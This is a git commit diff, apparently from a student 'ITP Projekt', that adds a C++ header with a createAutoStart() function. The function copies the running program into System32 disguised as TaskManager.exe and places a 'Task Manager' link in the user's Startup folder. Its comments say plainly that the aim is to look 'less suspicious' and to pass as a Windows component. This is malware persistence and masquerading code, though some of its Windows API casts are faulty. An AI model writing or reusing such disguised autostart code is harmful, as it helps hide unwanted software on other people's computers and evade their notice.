f4359553089bd89fc62a093440cbd4feeca702bf
Denzerson1 <130482776+Denzerson1@users.noreply.github.com>
2023-05-13 06:48:07 +0200

    Add files via upload

--- ITP Projekt/ITP Projekt/Autostart.h
+++ ITP Projekt/ITP Projekt/Autostart.h
@@ -1,3 +1,36 @@
 #pragma once
+#include <Windows.h>
+#include <iostream>
 
-void createAutostart();
+using namespace std;
+
+void createAutoStart() {
+	/* COPY SOME FILE TO SYSTEM32 FOR LESS SUSSY */
+	const unsigned int iMaxPathLength = 256;
+	char fileName[iMaxPathLength] = { 0 }; //filename (for example in downloads)
+	//Get the full path of the program
+	GetModuleFileName(NULL, (LPWSTR)fileName, iMaxPathLength);
+
+	//Copy file to system32 so its less suspicious, change name to windowdsdefender	
+	LPCTSTR lpNewFileName = L"C:\\Windows\\System32\\TaskManager.exe";
+	LPCTSTR copyFileName = (LPCTSTR)fileName;
+
+	BOOL bSuccess = CopyFile(copyFileName, lpNewFileName, FALSE);
+
+	if (!bSuccess) {
+		cout << "Error while copying file to system32";
+	}
+	else {
+		cout << "Copied file to system32";
+	}
+
+
+	LPCTSTR symlinkPath = L"C:\\Users\\Deniz\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Task Manager.lnk";
+
+	if (CreateSymbolicLink(symlinkPath, (LPCWSTR)fileName, 0) == 0) {
+		std::cout << "Error creating symbolic link: " << GetLastError() << std::endl;
+	}
+	else {
+		std::cout << "Symbolic link created successfully" << std::endl;
+	}
+}
